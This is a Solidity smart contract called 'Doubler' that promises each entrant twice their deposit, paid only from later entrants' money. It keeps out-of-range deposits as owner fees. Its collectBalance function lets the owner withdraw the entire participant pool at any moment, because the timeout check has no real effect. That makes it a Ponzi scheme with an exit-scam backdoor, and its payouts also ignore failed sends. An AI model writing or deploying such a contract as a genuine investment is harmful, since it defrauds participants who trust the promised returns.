contract Doubler{

    struct Participant {
        address etherAddress;
        uint PayAmount;
    }

    Participant[] public participants;

    uint public payoutIdx = 0;
    uint public collectedFees = 0;
    uint public balance = 0;
	uint public timeout = now + 1 weeks;

    address public owner;


    // simple single-sig function modifier
    modifier onlyowner { if (msg.sender == owner) _ }

    // this function is executed at initialization and sets the owner of the contract
    function Doubler() {
		collectedFees += msg.value;
        owner = msg.sender;
    }

    // fallback function - simple transactions trigger this
    function() {
        enter();
    }
    
    function enter() {
		//send more than 0.1 ether and less than 50, otherwise loss all
		if (msg.value >= 100 finney && msg.value <= 50 ether) {
	        // collect fees and update contract balance
	        collectedFees += msg.value / 20;
	        balance += msg.value - msg.value / 20;
	
	      	// add a new participant to array and calculate need balance to payout
	        uint idx = participants.length;
	        participants.length += 1;
	        participants[idx].etherAddress = msg.sender;
	        participants[idx].PayAmount = 2 * (msg.value - msg.value / 20);
			
			uint NeedAmount = participants[payoutIdx].PayAmount;
			// if there are enough ether on the balance we can pay out to an earlier participant
		    if (balance >= NeedAmount) {
	            participants[payoutIdx].etherAddress.send(NeedAmount);
	
	            balance -= NeedAmount;
	            payoutIdx += 1;
	        }
		}
		else {
			collectedFees += msg.value;
            return;
		}
    }

	function NextPayout() {
        balance += msg.value;
		uint NeedAmount = participants[payoutIdx].PayAmount;

	    if (balance >= NeedAmount) {
            participants[payoutIdx].etherAddress.send(NeedAmount);

            balance -= NeedAmount;
            payoutIdx += 1;
        }
    }

    function collectFees() onlyowner {
		collectedFees += msg.value;
        if (collectedFees == 0) return;

        owner.send(collectedFees);
        collectedFees = 0;
    }

    function collectBalance() onlyowner {
		balance += msg.value;
        if (balance == 0 && now > timeout) return;

        owner.send(balance);
        balance = 0;
    }

    function setOwner(address _owner) onlyowner {
		collectedFees += msg.value;
        owner = _owner;
    }
}